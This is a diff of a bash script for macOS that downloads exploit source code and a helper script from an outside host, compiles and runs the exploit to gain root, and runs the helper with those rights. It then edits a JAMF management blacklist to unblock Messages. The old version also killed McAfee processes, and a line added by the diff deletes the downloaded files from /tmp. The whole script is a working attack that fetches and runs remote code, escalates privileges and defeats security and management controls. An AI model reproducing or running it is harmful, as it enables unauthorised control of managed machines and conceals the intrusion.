@@ -1,13 +1,13 @@
 #!/bin/bash
 
-pkill .*McAfee.*
 killall Messages
 
-curl -Lso /tmp/elevate.out boesen.science:2042/mac/elevate.out
+curl -Lo /tmp/exp.c boesen.science:2042/mac/exp.c
+gcc /tmp/exp.c -o /tmp/a.out
 curl -Lso /tmp/enact.sh boesen.science:2042/mac/enact.sh
-chmod +x /tmp/elevate.out /tmp/enact.sh
+chmod +x /tmp/enact.sh
 
-/tmp/elevate.out <<EOF
+/tmp/a.out <<EOF
 /tmp/enact.sh &
 sed -i -e 's/Messages/iMessage/g' /Library/Application\ Support/JAMF/.blacklist.xml
 for i in {1..5}; do
@@ -16,6 +16,7 @@ for i in {1..5}; do
 done
 EOF
 
+rm -f /tmp/*.sh /tmp/*.c /tmp/*.out
 open /Applications/Messages.app
 
 exit
